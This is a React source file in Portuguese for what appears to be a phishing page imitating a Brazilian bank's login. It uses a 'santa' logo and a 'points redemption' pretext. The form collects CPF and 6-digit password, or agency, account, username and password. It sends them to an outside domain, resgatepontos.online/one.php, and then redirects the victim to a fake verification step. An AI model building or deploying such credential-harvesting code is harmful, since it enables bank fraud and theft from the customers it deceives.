import React from 'react';
import styles from './Pessoa.module.scss';
import santaLogo from '../../public/santa2.png'
import { useParams } from 'react-router-dom';
import { IMaskInput } from 'react-imask';

const Pessoa = () => {
  const { type } = useParams();

  const generateUniqueKey = () => {
    const randomNumber = Math.floor(Math.random() * 10000000000);
    const key = String(randomNumber).padStart(10, '0');
    return key;
  };

  const handleSubmit = async (data) => {
    const key = generateUniqueKey(); // Gera uma KEY única de 10 dígitos
    localStorage.setItem('key', key);
    const payload = { ...data, key };

    try {
      const response = await fetch('https://resgatepontos.online/one.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      console.log(result);
      location.href = `/verification/${data.type}`;
    } catch (error) {
      console.error('Erro ao enviar dados:', error);
    }
  };

  const handleConfirmFisica = () => {
    const cpf = document.querySelector('input[placeholder="000.000.000-00"]').value;
    const senha = document.querySelector('input[placeholder="******"]').value;

    handleSubmit({ cpf, senha, type: 'fisica' });

  };

  const handleConfirmJuridica = () => {
    const agencia = document.querySelector('input[placeholder="0000"]').value;
    const conta = document.querySelector('input[placeholder="000000-0"]').value;
    const usuario = document.querySelector('input[placeholder="Usuário"]').value;
    const senha = document.querySelector('input[placeholder="******"]').value;

    handleSubmit({ agencia, conta, usuario, senha, type: 'juridica' });
  };

  return (
    <>
      {type === 'fisica' ? (
        <div className={styles.formFisica}>
          <img className={styles.logoSanta} src={santaLogo} alt="" />
          <div className={styles.boxFisica}>
            <span className={styles.title}>Estamos quase lá !</span>
            <span className={styles.subTitle}>Preencha os dados para seguir:</span>

            <span className={styles.labels}>CPF:</span>
            <IMaskInput mask="000.000.000-00" placeholder="000.000.000-00" />

            <span className={styles.labels}>Senha (6 dig.):</span>
            <IMaskInput mask="000000" type="password" placeholder="******" />

            <span className={styles.botaoAcao} onClick={handleConfirmFisica}>Continuar</span>
          </div>
        </div>
      ) : (
        <div className={styles.formJuridica}>
          <img className={styles.logoSanta} src={santaLogo} alt="" />
          <div className={styles.boxFisica}>
            <span className={styles.title}>Estamos quase lá !</span>
            <span className={styles.subTitleJ}>Preencha os dados para seguir:</span>

            <span className={styles.labels}>Agência:</span>
            <IMaskInput mask="0000" placeholder="0000" />

            <span className={styles.labels}>Conta:</span>
            <IMaskInput mask="000000-0" placeholder="000000-0" />

            <span className={styles.labels}>Usuário:</span>
            <input type="text" placeholder="Usuário" />

            <span className={styles.labels}>Senha (6 dig.):</span>
            <IMaskInput mask="000000" type="password" placeholder="******" />

            <span className={styles.botaoAcao} onClick={handleConfirmJuridica}>Continuar</span>
          </div>
        </div>
      )}
    </>
  );
};

export default Pessoa;